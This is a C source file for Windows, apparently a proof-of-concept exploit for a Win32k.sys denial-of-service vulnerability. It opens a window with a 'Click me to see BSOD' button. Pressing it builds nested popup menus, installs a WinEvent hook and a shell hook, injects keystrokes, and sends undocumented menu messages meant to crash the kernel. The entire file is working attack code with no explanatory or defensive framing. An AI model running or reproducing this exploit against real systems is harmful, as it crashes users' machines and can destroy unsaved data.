//#include "stdafx.h"
#include <windows.h>
  
#define BSOD_BUTTON 0x9876
  
HMENU hMenu[3];
ULONG MenuLevel = 0;
HWND hTargetMenuWnd = 0;
  
void KeyEvent()
{
    INPUT input;
    memset(&input, 0, sizeof(input));
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = VkKeyScanA('1');
   
    SendInput(1, &input, sizeof(input));
  
    Sleep(50);
   
    memset(&input, 0, sizeof(input));
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = VkKeyScanA('1');
    input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &input, sizeof(input));
}
  
LRESULT CALLBACK HookProc(
    int nCode,
    WPARAM wParam,
    LPARAM lParam)
{
    if (nCode == HSHELL_WINDOWACTIVATED && hTargetMenuWnd != NULL)
    {
        return SendMessage(hTargetMenuWnd, 0x1E3, 0, 0);
    }
  
    return 0;
}
  
VOID CALLBACK WinEventProc(
    HWINEVENTHOOK hWinEventHook,
    DWORD event,
    HWND hWnd,
    LONG idObject,
    LONG idChild,
    DWORD idEventThread,
    DWORD dwmsEventTime)
{
    ++MenuLevel;
          
    if (MenuLevel == 1)
    {
        KeyEvent();
    }
    else if (MenuLevel == 2)
    {
        SetWindowsHookEx(WH_SHELL, HookProc, GetModuleHandleA(NULL), GetCurrentThreadId());
              
        hTargetMenuWnd = hWnd;
        SendMessage(hTargetMenuWnd, 0x1F2, 0, 0);
    }
}
  
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
        if (LOWORD(wParam) == BSOD_BUTTON)
        {
            SetWinEventHook(
                EVENT_SYSTEM_MENUPOPUPSTART,
                EVENT_SYSTEM_MENUPOPUPSTART,
                GetModuleHandleA(NULL),
                WinEventProc,
                GetCurrentProcessId(),
                GetCurrentThreadId(),
                WINEVENT_OUTOFCONTEXT);
  
            TrackPopupMenuEx(hMenu[0], 0, 20, 20, hWnd, NULL);
        }
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcA(hWnd, message, wParam, lParam);
    }
  
    return 0;
}
  
int APIENTRY WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ PSTR lpCmdLine,
    _In_ int nCmdShow)
{
    WNDCLASSA Class;
    Class.style = 0;
    Class.lpfnWndProc = WndProc;
    Class.cbClsExtra = 0;
    Class.cbWndExtra = 0;
    Class.hInstance = GetModuleHandleA(NULL);
    Class.hIcon = NULL;
    Class.hCursor = LoadCursor(0, IDC_ARROW);
    Class.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    Class.lpszMenuName = NULL;
    Class.lpszClassName = "MyWinClass";
  
    if (RegisterClassA(&Class) != NULL)
    {
        HWND hMainWnd = CreateWindowA(
            "MyWinClass",
            "Microsoft Windows Win32k.sys Denial of Service Vulnerability",
            WS_POPUPWINDOW | WS_BORDER | WS_CAPTION | WS_VISIBLE,
            0, 0, 500, 200,
            NULL,
            NULL,
            hInstance,
            NULL);
  
        if (hMainWnd != NULL)
        {
            HWND hButton = CreateWindowA(
                "Button",
                "Click me to see BSOD",
                WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                150, 50, 200, 50,
                hMainWnd,
                (HMENU)BSOD_BUTTON,
                hInstance,
                NULL);
          
            if (hButton != 0)
            {
                hMenu[0] = CreatePopupMenu();
                hMenu[1] = CreatePopupMenu();
                hMenu[2] = CreatePopupMenu();
  
                AppendMenuA(hMenu[0], MF_POPUP | MF_STRING | MF_MOUSESELECT | MF_BYCOMMAND, (UINT_PTR)hMenu[1], "1");
                AppendMenuA(hMenu[1], MF_POPUP | MF_STRING | MF_MOUSESELECT | MF_BYCOMMAND, (UINT_PTR)hMenu[2], "1");
                AppendMenuA(hMenu[2], MF_POPUP | MF_STRING | MF_MOUSESELECT | MF_BYCOMMAND, (UINT_PTR)0, "1");
  
                MSG msg;
                while (GetMessage(&msg, NULL, 0, 0))
                {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
            }
        }
    }
      
    return 0;
}
